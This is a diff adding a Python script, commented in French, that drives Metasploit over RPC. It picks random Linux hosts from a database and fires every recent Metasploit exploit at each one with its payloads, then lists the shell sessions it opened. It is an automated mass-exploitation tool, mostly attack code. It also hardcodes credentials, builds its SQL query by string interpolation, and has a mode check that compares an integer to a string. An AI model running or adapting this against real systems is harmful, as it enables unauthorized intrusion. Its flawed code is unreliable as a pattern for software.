@@ -1,0 +1,181 @@
+#!/usr/bin/env python3
+# corrige par code copilot
+import os
+import psutil
+import time
+import socket
+import subprocess
+import psycopg2
+from pymetasploit3.msfrpc import MsfRpcClient
+
+# Récupération sécurisée des credentials PostgreSQL
+PG_USER = os.getenv("PG_USER", "postgres")
+PG_PASSWORD = os.getenv("PG_PASSWORD", "bojemoi")  # Ne pas mettre de valeur par défaut pour plus de sécurité
+PG_DBNAME = os.getenv("PG_DBNAME", "msf")
+PG_HOST = "postgres"
+
+MODE_RUN = 0
+
+# Récupérer l'adresse IP du serveur PostgreSQL
+def get_postgres_ip():
+    try:
+        return socket.gethostbyname(PG_HOST)
+    except socket.gaierror:
+        print(f"[ERREUR] Impossible de résoudre {PG_HOST}")
+        return None
+
+# Vérifier si PostgreSQL est prêt
+def is_postgres_ready(ip):
+    try:
+        result = subprocess.run(
+            ["pg_isready", "-h", ip, "-U", PG_USER, "-d", PG_DBNAME],
+            stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
+        )
+        return result.returncode == 0
+    except Exception as e:
+        print(f"[ERREUR] Vérification PostgreSQL échouée : {e}")
+        return False
+
+# Récupérer un hôte aléatoire depuis la base de données
+def get_random_host(type):
+    try:
+        with psycopg2.connect(dbname=PG_DBNAME, user=PG_USER, password=PG_PASSWORD, host=PG_HOST) as conn:
+            with conn.cursor() as cur:
+                cur.execute(f"SELECT id, address FROM hosts WHERE os_name = '{type}' ORDER BY RANDOM() LIMIT 1;")
+                return cur.fetchone() or (None, None)
+    except psycopg2.Error as e:
+        print(f"[ERREUR] Problème lors de la récupération d'un hôte : {e}")
+        return None, None
+
+def kill_process_by_name(process_name):
+    for proc in psutil.process_iter(['pid', 'name']):
+#        print(f"[INFO] Processus {proc.info['name']} (PID: {proc.info['pid']}) ...")
+        if process_name in proc.info['name']:
+            try:
+                proc2kill = psutil.Process(proc.info['pid'])
+                proc2kill.terminate()
+                proc2kill.wait(timeout=3)
+                print(f"[INFO] Processus {process_name} (PID: {proc.info['pid']}) terminé.")
+            except psutil.NoSuchProcess:
+                print(f"[ERREUR] Processus {process_name} n'existe plus.")
+            except psutil.AccessDenied:
+                print(f"[ERREUR] Accès refusé pour terminer le processus {process_name} (PID: {proc.info['pid']}).")
+            except psutil.TimeoutExpired:
+                print(f"[ERREUR] Temps d'attente expiré pour terminer le processus {process_name} (PID: {proc.info['pid']}).")
+            return
+
+
+
+# Boucle principale
+def main():
+    pg_ip = get_postgres_ip()
+    if not pg_ip:
+        return
+
+    if is_postgres_ready(pg_ip):
+        print(f"[INFO] PostgreSQL détecté à {pg_ip}")
+    else:
+        print(f"[ERREUR] Port 5432 ouvert mais PostgreSQL ne répond pas à {pg_ip}")
+        return
+    
+#    kill_process_by_name('ruby')
+#    time.sleep (5)
+
+#    pwd = os.getenv("PWD")
+#    command = ["msfconsole", "-r", f"{pwd}/msfconsole.rc", "-q", "-x", f"db_connect {PG_USER}:{PG_PASSWORD}@{pg_ip}/{PG_DBNAME}"]
+#    print(f"[INFO] Lancement sur {pg_ip}")
+
+#    try:
+#        processus = subprocess.Popen(command)
+#        time.sleep(60)
+#    except subprocess.CalledProcessError as e:
+#        print(f"[ERREUR] Échec Lancement msfconsole en arrière-plan : {e}")
+#        return
+
+    client = MsfRpcClient('totototo', port=55553, server="192.168.1.47", ssl=True)
+    search_results = client.modules.search('linux')
+    while True: 
+
+     console_id = client.consoles.console().cid
+     console = client.consoles.console(console_id)
+     host_id, host = get_random_host('Linux')
+     if not host:
+         print("[INFO] Aucun hôte disponible.")
+         return
+ 
+     print(f"[INFO] Scan de {host} en cours...")
+#  Afficher les résultats de la recherche
+
+
+
+
+     for index in range (1, len(search_results)):
+        if (search_results[index]['type'] != 'exploit'):
+            print('+',end ="")
+            continue
+
+        if (search_results[index]['disclosuredate'] < "2021-01-01" ):
+            print('+',end ="")
+            continue
+
+        try:
+#            print (search_results[index])
+            exploit = client.modules.use('exploit',  search_results[index]['fullname'])
+        except:
+            print ("erreur dans les resultats")
+            continue
+
+        exploit.target = 0
+        payload = exploit.targetpayloads()
+        print (f"missing required : {exploit.missing_required}")
+        missing  =  exploit.missing_required
+        if (len(missing) > 0):
+          for index1 in range(0, len(missing)):
+            match missing[index1]:
+               case "RHOSTS":
+                    exploit[missing[index1]] = host
+               case "TARGET_PATH":
+                    exploit[missing[index1]] = "/"
+               case "SESSION":
+                    exploit[missing[index1]] = 1 
+               case "LHOST":
+                    exploit[missing[index1]] = "1.1.1.1" 
+               case _:
+                    print (f"Pas traite {missing[index1]}")
+
+#        print (exploit.runoptions)
+#        print (f" payload {payload}")
+        if (len (payload) > 0):
+          if ( MODE_RUN == "1" ):
+            for index1 in range(0, len(payload)):
+              print (f"{search_results[index]['fullname']} payload {payload[index1]}", end='')
+              try:
+                  console.run_module_with_output(exploit, payload[index1])
+                  print (": Ok")
+              except:
+                  print (": A controler")
+                  continue
+          else:
+              print (f"{search_results[index]['fullname']} payload {payload[index1]}", end='')
+              try:
+                  console.run_module_with_output(exploit)
+                  print (": Ok")
+              except:
+                  print (": A controler")
+                  continue
+
+
+        while console.is_busy():
+             print("+",end="")
+             time.sleep(1)
+
+     print(f"[INFO] Scan de {host} terminé.")
+
+     sessions = client.sessions.list
+     print(f"[INFO] Sessions actives: {sessions}")
+
+
+if __name__ == "__main__":
+    main()
+
+
